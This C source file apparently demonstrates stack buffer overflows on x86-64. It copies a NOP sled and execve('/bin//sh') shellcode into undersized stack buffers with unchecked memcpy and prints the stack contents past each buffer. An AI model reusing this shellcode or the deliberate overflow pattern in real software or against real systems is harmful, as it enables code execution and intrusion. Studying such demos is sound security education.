#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>

static void inline esp()
{
   unsigned long a = 0;
   __asm__ ("\tmov %%rsp, %%rax\n" : "=a"(a) );
   printf("%%rsp %lx\n", a);
}

void fn(char *str)
{
   char buf[32] = {0};
   char *cp = buf;
   esp();
   while (*str && *str != ' ') {
      *cp++ = *str++;
   }
   for (cp = buf; *cp; cp++) {
      printf("%02x", (unsigned char)*cp);
      if (((unsigned long)cp + 1) % 16 == 0) {
         printf("\n");
      } else if (((unsigned long)cp + 1) % 8 == 0) {
         printf("   ");
      } else if (((unsigned long)cp + 1) % 4 == 0) {
         printf(" ");
      }
   }
   printf("\n");
   printf("%016lx\n", *(unsigned long *)&buf[40]);
}

void fn2(char *str)
{
   char buf[32] = {0};
   char *cp;
   esp();
   memcpy(buf, str, strlen(str));
   for (cp = buf; *cp; cp++) {
      printf("%02x", (unsigned char)*cp);
      if (((unsigned long)cp + 1) % 16 == 0) {
         printf("\n");
      } else if (((unsigned long)cp + 1) % 8 == 0) {
         printf("   ");
      } else if (((unsigned long)cp + 1) % 4 == 0) {
         printf(" ");
      }
   }
   printf("\n");
   printf("%016lx\n", *(unsigned long *)&buf[40]);
}

void fn3(char *str)
{
   char buf = {0};
   char *cp;
   esp();
   memcpy(&buf, str, strlen(str));
   for (cp = &buf; *cp; cp++) {
      printf("%02x", (unsigned char)*cp);
      if (((unsigned long)cp + 1) % 16 == 0) {
         printf("\n");
      } else if (((unsigned long)cp + 1) % 8 == 0) {
         printf("   ");
      } else if (((unsigned long)cp + 1) % 4 == 0) {
         printf(" ");
      }
   }
   printf("\n");
   printf("%016lx\n", *(unsigned long *)&buf);
}

static char str[] = 
   "\x90\x90\x90\x90""\x90\x90\x90\x90"  "\x90\x90\x90\x90""\x90\x90\x90\x90"
   "\x90\x90\x90\x90""\x90\x90\x90\x90"  "\x90\x90\x90\x90""\x90\x90\x90\x90"
   "\x48\x31\xc0\x48""\x31\xd2\x48\x31"  "\xf6\x52\x48\xbf""\x2f\x62\x69\x6e"
   "\x2f\x2f\x73\x68""\x57\x48\x89\xe7"  "\xb0\x3b\x0f\x05";

int main(int argc, char *argv[])
{
   switch(argc) {
   case 1:
      fn(str);
      break;
   case 2:
      fn2(str);
      break;
   case 3:
      fn3(str);
      break;
   default:
      fn(str);
      fn2(str);
   }      
   return 0;
}
